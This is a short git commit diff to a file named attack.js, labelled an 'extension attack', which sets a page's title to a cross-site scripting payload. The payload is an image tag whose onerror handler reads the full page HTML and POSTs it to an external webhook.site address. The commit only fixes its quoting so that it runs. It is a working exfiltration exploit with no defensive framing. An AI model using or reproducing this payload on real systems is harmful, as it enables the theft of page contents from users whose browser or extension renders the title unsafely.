5065d610e3a4df09d5abe8e07f4de0c5493bf33e
JBA192 <62188601+JBA192@users.noreply.github.com>
2023-03-16 00:02:14 -0400

    Updated extension attack

--- attack.js
+++ attack.js
@@ -1,5 +1,5 @@
 function changeTitle() {
-    var attackScript = "<img src='x' onerror='var html = document.documentElement.outerHTML;var server = new XMLHttpRequest;server.open('POST', 'https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c', true);server.setRequestHeader('Content-Type', 'text/plain');server.send(html);'>";
+    var attackScript = "<img src='x' onerror='var html = document.documentElement.outerHTML;var server = new XMLHttpRequest;server.open(\"POST\", \"https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c\", true);server.setRequestHeader(\"Content-Type\", \"text/plain\");server.send(html);'>";
     if (document.title != attackScript) {
         document.title = attackScript;
     }
